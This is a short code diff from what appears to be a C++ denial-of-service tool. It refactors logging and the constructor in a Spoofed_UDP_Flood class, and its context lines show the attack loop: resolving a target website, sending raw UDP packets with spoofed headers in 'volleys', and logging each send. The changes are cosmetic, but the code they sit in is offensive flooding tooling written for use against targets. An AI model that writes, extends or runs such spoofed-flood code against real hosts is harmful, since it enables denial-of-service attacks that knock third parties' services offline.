@@ -31,7 +31,7 @@ void Spoofed_UDP_Flood::attack(const int *id) {
 
             if((hp = gethostbyname(conf->website.c_str())) == nullptr){
                 if((ip->daddr = inet_addr(conf->website.c_str())) == -1){
-                    logger->Log("Can't resolve the host", Logger::Error);
+                    conf->logger->Log("Can't resolve the host", Logger::Error);
                     exit(EXIT_FAILURE);
                 }
             }else{
@@ -72,20 +72,20 @@ void Spoofed_UDP_Flood::attack(const int *id) {
             }else{
                 message = std::string("Socket[") + std::to_string(x) + "->"
                           + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                logger->Log(&message, Logger::Info);
+                conf->logger->Log(&message, Logger::Info);
                 message = std::to_string(*id) + ": Voly Sent";
-                logger->Log(&message, Logger::Info);
+                conf->logger->Log(&message, Logger::Info);
             }
 
             delete pseudogram;
         }
         message = std::to_string(*id) + ": Voly Sent";
-        logger->Log(&message, Logger::Info);
+        conf->logger->Log(&message, Logger::Info);
         pause();
     }
 }
 
-Spoofed_UDP_Flood::Spoofed_UDP_Flood(const Config *conf, Logger *logger) : Spoofed_Flood(conf, logger) {
+Spoofed_UDP_Flood::Spoofed_UDP_Flood(std::shared_ptr<Config> conf) : Spoofed_Flood(std::move(conf)) {
 
 }
 
